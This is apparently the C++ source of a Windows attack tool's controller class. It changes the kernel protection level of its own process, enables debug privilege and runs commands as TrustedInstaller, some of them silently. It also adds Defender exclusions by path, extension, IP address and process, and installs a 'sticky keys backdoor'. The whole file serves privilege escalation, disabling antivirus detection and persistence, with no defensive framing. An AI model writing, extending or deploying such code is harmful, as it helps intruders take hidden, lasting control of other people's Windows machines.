// ControllerSystemIntegration.cpp
#include "Controller.h"
#include "common.h"
#include "Utils.h"

// Self-protection operations for process elevation
bool Controller::SelfProtect(const std::wstring& protectionLevel, const std::wstring& signerType) noexcept {
    auto level = Utils::GetProtectionLevelFromString(protectionLevel);
    auto signer = Utils::GetSignerTypeFromString(signerType);

    if (!level || !signer) {
        ERROR(L"Invalid protection level or signer type specified");
        return false;
    }

    UCHAR newProtection = Utils::GetProtection(level.value(), signer.value());
    return SetCurrentProcessProtection(newProtection);
}

bool Controller::SetCurrentProcessProtection(UCHAR protection) noexcept {
    DWORD currentPid = GetCurrentProcessId();
    auto kernelAddr = GetProcessKernelAddress(currentPid);
    if (!kernelAddr) {
        ERROR(L"Failed to get kernel address for current process");
        return false;
    }
    return SetProcessProtection(kernelAddr.value(), protection);
}

bool Controller::EnableDebugPrivilege() noexcept {
    HANDLE hToken;
    TOKEN_PRIVILEGES tokenPrivileges;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return false;

    LookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &tokenPrivileges.Privileges[0].Luid);
    tokenPrivileges.PrivilegeCount = 1;
    tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    bool result = AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, 0, NULL, 0);
    CloseHandle(hToken);
    return result;
}

// TrustedInstaller integration for maximum privilege operations
bool Controller::RunAsTrustedInstaller(const std::wstring& commandLine) {
    return m_trustedInstaller.RunAsTrustedInstaller(commandLine);
}

bool Controller::RunAsTrustedInstallerSilent(const std::wstring& command) {
    return m_trustedInstaller.RunAsTrustedInstallerSilent(command);
}

bool Controller::AddContextMenuEntries() {
    return m_trustedInstaller.AddContextMenuEntries();
}

// Legacy Defender exclusion management (backward compatibility)
bool Controller::AddToDefenderExclusions(const std::wstring& customPath) {
    return m_trustedInstaller.AddToDefenderExclusions(customPath);
}

bool Controller::RemoveFromDefenderExclusions(const std::wstring& customPath) {
    return m_trustedInstaller.RemoveFromDefenderExclusions(customPath);
}

// Enhanced Defender exclusion management with type specification
bool Controller::AddDefenderExclusion(TrustedInstallerIntegrator::ExclusionType type, const std::wstring& value) {
    return m_trustedInstaller.AddDefenderExclusion(type, value);
}

bool Controller::RemoveDefenderExclusion(TrustedInstallerIntegrator::ExclusionType type, const std::wstring& value) {
    return m_trustedInstaller.RemoveDefenderExclusion(type, value);
}

// Type-specific exclusion convenience methods
bool Controller::AddExtensionExclusion(const std::wstring& extension) {
    return m_trustedInstaller.AddExtensionExclusion(extension);
}

bool Controller::RemoveExtensionExclusion(const std::wstring& extension) {
    return m_trustedInstaller.RemoveExtensionExclusion(extension);
}

bool Controller::AddIpAddressExclusion(const std::wstring& ipAddress) {
    return m_trustedInstaller.AddIpAddressExclusion(ipAddress);
}

bool Controller::RemoveIpAddressExclusion(const std::wstring& ipAddress) {
    return m_trustedInstaller.RemoveIpAddressExclusion(ipAddress);
}

bool Controller::AddProcessExclusion(const std::wstring& processName) {
    return m_trustedInstaller.AddProcessToDefenderExclusions(processName);
}

bool Controller::RemoveProcessExclusion(const std::wstring& processName) {
    return m_trustedInstaller.RemoveProcessFromDefenderExclusions(processName);
}

bool Controller::AddPathExclusion(const std::wstring& path) {
    return m_trustedInstaller.AddDefenderExclusion(TrustedInstallerIntegrator::ExclusionType::Paths, path);
}

bool Controller::RemovePathExclusion(const std::wstring& path) {
    return m_trustedInstaller.RemoveDefenderExclusion(TrustedInstallerIntegrator::ExclusionType::Paths, path);
}

// Sticky keys backdoor operations with TrustedInstaller integration
bool Controller::InstallStickyKeysBackdoor() noexcept {
    return m_trustedInstaller.InstallStickyKeysBackdoor();
}

bool Controller::RemoveStickyKeysBackdoor() noexcept {
    return m_trustedInstaller.RemoveStickyKeysBackdoor();
}